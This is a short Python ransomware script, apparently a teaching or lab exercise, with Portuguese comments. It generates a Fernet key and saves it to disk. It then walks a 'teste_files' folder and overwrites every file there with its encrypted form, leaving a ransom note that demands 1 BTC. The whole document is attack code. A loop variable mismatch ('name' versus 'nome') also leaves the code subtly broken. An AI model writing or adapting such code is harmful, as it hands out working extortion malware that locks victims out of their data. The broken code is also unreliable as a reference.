from cryptography.fernet import Fernet
import os

#1. Gerar uma chave de criptografia e salvar

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
       
       
#2. Carregar a chave salvar
def carregar_chave():
    return open("chave.key", "rb").read()

#3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)
        
#4. Encontrar arquivos para criptografar_arquivo
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for name in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista
    
#5. Mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie 1 BTC para o endereço X e o comprovante para Y!\n")
        f.write("Depois disso, enviaremos a chave para recuperar os dados!\n")
        
#6. Execução Principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("teste_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransomware executado! Arquivos Criptografados!")

if __name__ == "__main__":
    main()
    

    